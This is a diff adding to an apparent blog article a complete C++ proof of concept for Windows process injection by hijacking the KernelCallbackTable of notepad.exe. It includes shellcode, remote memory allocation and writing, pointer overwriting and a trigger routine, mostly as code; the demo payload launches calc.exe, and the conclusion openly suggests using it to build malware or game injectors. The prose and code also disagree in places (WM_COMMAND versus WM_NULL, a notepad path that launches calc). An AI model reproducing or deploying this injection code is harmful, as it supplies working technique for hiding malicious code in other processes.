@@ -96,17 +96,279 @@ For example on my PoC I will target the function `fnDWORD` inside this array. `f
 
 In my PoC, I will target `notepad.exe`. First I will open a handle to victim process with `PROCESS_QUERY_INFORMATION` and with that handle I will call `NtQueryInformationProcess` to retrieve PEB address from `PROCESS_BASIC_INFORMATION` structure. From this PEB struct I will retrieve KernelCallbackTable and in this table I will hook 3rd function which is `fnDWORD`. Then when WM_COMMAND message is processed to victim window it will trigger `fnDWORD` in victim process which will execute my shellcode later.
 
+### Shellcode
+
+My shellcode is responsible for calling CreateProcessA and launching Notepad.exe. I like the way I'm mapping my shellcode because it's a cleaner and more reliable way to execute a payload on a remote target. However, you can't pass arguments directly to the function. You should also map the arguments to the target process and make them accessible to the function, as I did in my proof of concept (PoC)
+
+```cpp
+#pragma pack(push, 1)
+struct shellcode_args {
+	char notepad_path[60];
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	PVOID create_process;
+	PVOID wait_for_single_object;
+	PVOID closehandle;
+	BOOL completed = FALSE;
+};
+#pragma pack(pop)
+
+#pragma runtime_checks( "", off )
+#pragma optimize( "", off )
+void shellcode() {
+	shellcode_args* args = (shellcode_args*)0xF1F1F1F1F1F1F1F1;
+
+	LPCSTR notepadPath = args->notepad_path;
+	create_process_template f1 = create_process_template(args->create_process);
+	wait_for_single_object_template f2 = wait_for_single_object_template(args->wait_for_single_object);
+	closehandle_template f3 = closehandle_template(args->closehandle);
+
+	f1(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &args->si, &args->pi);
+
+	f2(args->pi.hProcess, INFINITE);
+	args->completed = TRUE;
+	f3(args->pi.hProcess);
+	f3(args->pi.hThread);
+	return;
+};
+void shellcode_end() {  };
+#pragma runtime_checks( "", on )
+#pragma optimize( "", on )
+```
+### Retrieving PEB Address of Remote Process
+
+It's a piece of cake as you can do it by calling the Windows API NtQueryInformationProcess.
+
+```cpp
+DWORD64 GetRemotePEB(HANDLE handle) {
+	HMODULE hNTDLL = GetModuleHandleA("ntdll.dll");
+
+	if (!hNTDLL)
+		return 0;
+
+	FARPROC fpNtQueryInformationProcess = GetProcAddress
+	(
+		hNTDLL,
+		"NtQueryInformationProcess"
+	);
+
+	if (!fpNtQueryInformationProcess)
+		return 0;
+
+	NtQueryInformationProcess ntQueryInformationProcess =
+		(NtQueryInformationProcess)fpNtQueryInformationProcess;
+
+	PROCESS_BASIC_INFORMATION* pBasicInfo =
+		new PROCESS_BASIC_INFORMATION();
+
+	DWORD dwReturnLength = 0;
+
+	ntQueryInformationProcess
+	(
+		handle,
+		0,
+		pBasicInfo,
+		sizeof(PROCESS_BASIC_INFORMATION),
+		&dwReturnLength
+	);
+
+	return DWORD64(pBasicInfo->PebBaseAddress);
+}
+```
+
+### Dispatching Message to Windows
+
+As I mentioned in my article, I will hook the fnDWORD function from the KernelCallbackTable and send a message of type WM_COMMAND since its wParam can be treated as a DWORD, which will later trigger our payload.
+
+```cpp
+DWORD victim_pid{ NULL };
+
+inline BOOL CALLBACK EnumWindowFunc(HWND hwnd, LPARAM param)
+{
+	DWORD pid = 0;
+	GetWindowThreadProcessId(hwnd, &pid);
+	if (pid == victim_pid)
+	{
+		SendMessageTimeoutW(hwnd, WM_NULL, 0, 0, SMTO_NORMAL, 1, nullptr);
+		return FALSE;
+	}
+	return TRUE;
+}
+```
+## Fullcode
+
 ```cpp
 #include <Windows.h>
 #include <stdio.h>
 
-#define PROCESS_ID
+int main()
+{
 
-int main(){
+	// retrieve our victim's window handle.
+	HWND victim_hwnd = FindWindowA("Notepad", NULL);
 
-HANDLE victim_handle = OpenProcess(PROCESS_QUERY_INFORMATION, NULL, pid);
+	// retrieve our victim's process id.
 
+	GetWindowThreadProcessId(victim_hwnd, &victim_pid);
+
+	// open handle to victim
+	HANDLE victim_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victim_pid);
+
+	// query victim process to retrieve peb address
+
+	uintptr_t victim_peb = GetRemotePEB(victim_handle);
+
+	// read kernelcallback table address which is at peb + 0x58
+	uintptr_t kct_address{ 0 };
+	SIZE_T    number_of_bytes_read{ 0 };
+	BOOL result = ReadProcessMemory(victim_handle, PVOID(victim_peb + 0x58), &kct_address, sizeof uintptr_t, &number_of_bytes_read);
+
+	if (!result || !kct_address)
+	{
+		return FALSE;
+	}
+
+	// fnDWORD function is located at table 0x10 which is 3rd of the table.
+
+	uintptr_t function_to_hook = kct_address + 0x10;
+	uintptr_t org_function;
+
+	ReadProcessMemory(victim_handle, PVOID(function_to_hook), &org_function, 8, &number_of_bytes_read);
+
+	// get size of our shellcode.
+	UINT32 shellcode_length = DWORD64(shellcode_end) - DWORD64(shellcode);
+
+	// allocate remote memory for our shellcode and map on it.
+	PVOID remote_shellcode = VirtualAllocEx(victim_handle, NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	if (!remote_shellcode)
+	{
+		return false;
+	}
+
+	// allocate local memory for our shellcode.
+	PBYTE local_shellcode = (PBYTE)VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (!local_shellcode)
+	{
+		return false;
+	}
+
+	// prepare our args and map it to victim memory.
+	shellcode_args args;
+	memset(&args, 0, sizeof shellcode_args);
+
+	const char* path_buffer = "C:\\Windows\\System32\\calc.exe";
+	memcpy(args.notepad_path, path_buffer, 60);
+
+
+
+	memset(&args.si, 0, sizeof args.si);
+	memset(&args.pi, 0, sizeof args.pi);
+
+	args.closehandle = (PVOID)CloseHandle;
+	args.create_process = (PVOID)CreateProcessA;
+	args.wait_for_single_object = (PVOID)WaitForSingleObject;
+
+
+
+	PVOID remote_args = VirtualAllocEx(victim_handle, NULL, sizeof shellcode_args, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (!remote_args)
+	{
+		printf("[ERROR]%X \n", GetLastError());
+		return FALSE;
+	}
+	SIZE_T    number_of_bytes_written{ 0 };
+	result = WriteProcessMemory(victim_handle, remote_args, &args, sizeof shellcode_args, &number_of_bytes_written);
+
+	if (!result)
+	{
+		printf("[ERROR]%X \n", GetLastError());
+		return FALSE;
+	}
+
+	
+	// copy our shellcode to our local buffer and then patch it
+	memset(local_shellcode, NULL, shellcode_length);
+
+	
+	memcpy(local_shellcode, shellcode, shellcode_length);
+
+	for (size_t i = 0; i < shellcode_length; i++)
+	{
+		// Write our args address
+		if (*(DWORD64*)&(local_shellcode[i]) == 0xF1F1F1F1F1F1F1F1)
+		{
+			*(DWORD64*)&(local_shellcode[i]) = DWORD64(remote_args);
+			break;
+		}
+	}
+	result = WriteProcessMemory(victim_handle, remote_shellcode, local_shellcode, shellcode_length, &number_of_bytes_written);
+
+	if (!result)
+	{
+		printf("[ERROR]%X \n", GetLastError());
+		return FALSE;
+	}
+
+
+	BOOL resp;
+	
+
+	DWORD oldP;
+
+
+	resp = VirtualProtectEx(victim_handle, (PVOID)(function_to_hook), 0x1000, PAGE_READWRITE, &oldP);
+	if (!resp)
+	{
+		printf("[ERROR]%X \n", GetLastError());
+		return FALSE;
+	}
+
+	Sleep(100);
+
+	resp = WriteProcessMemory(victim_handle, (PVOID)(function_to_hook), &remote_shellcode, sizeof uintptr_t, &number_of_bytes_written);
+
+	if (!resp)
+	{
+		printf("[ERROR]%X \n", GetLastError());
+		return FALSE;
+	}
+	
+	//dispatch window message and trigger our payload
+	EnumWindows(EnumWindowFunc, 0);
+
+	// wait for response from our shellcode
+	while (!args.completed)
+	{
+		ReadProcessMemory(victim_handle, remote_args, &args, sizeof(args), &number_of_bytes_read);
+	}
+	
+	//restore pointer
+	resp = WriteProcessMemory(victim_handle, (PVOID)(function_to_hook), &org_function, sizeof uintptr_t, &number_of_bytes_written);
+	
+	printf("Finished.\n");
+	
+	//free memory
+	VirtualFreeEx(victim_handle, remote_args, sizeof shellcode_args, MEM_FREE);
+	VirtualFreeEx(victim_handle, remote_shellcode, shellcode_length, MEM_FREE);
+	VirtualFree(local_shellcode, shellcode_length, MEM_FREE);
+    
+	system("pause");
+	return TRUE;
 }
 ```
+
+## Demonstration
+
+![Desktop View](/images/poc.gif)
+
+# Conclusion
+
+That's it! That's what I wanted to show you. There's always a vulnerability when you come up with different ideas. Just think outside the box and break your chains. You can use the code execution vulnerability I showed above to do anything you want. You can make an injector for a game you like or you can make a malware.
+
+That's all for now. See you on my next article :wave:
+
 {% if page.comments %} {% include disqus.html %} {% endif %}
 
